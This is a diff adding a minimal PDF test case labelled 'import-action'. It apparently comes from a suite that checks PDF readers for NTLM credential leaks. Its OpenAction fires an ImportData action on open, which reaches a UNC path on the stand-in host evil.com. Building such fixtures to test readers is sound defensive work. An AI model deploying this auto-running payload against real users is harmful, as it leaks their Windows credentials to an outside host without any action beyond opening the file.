@@ -1,0 +1,67 @@
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 5 0 R
+     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 73 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'import-action') Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /ImportData
+     /F << /Type /FileSpec /F (\\\\evil.com\\ntlm-test-07-import-action.pdf) /V true >>
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f 
+0000000010 00000 n 
+0000000187 00000 n 
+0000000288 00000 n 
+0000000553 00000 n 
+0000000678 00000 n 
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+826
+%%EOF
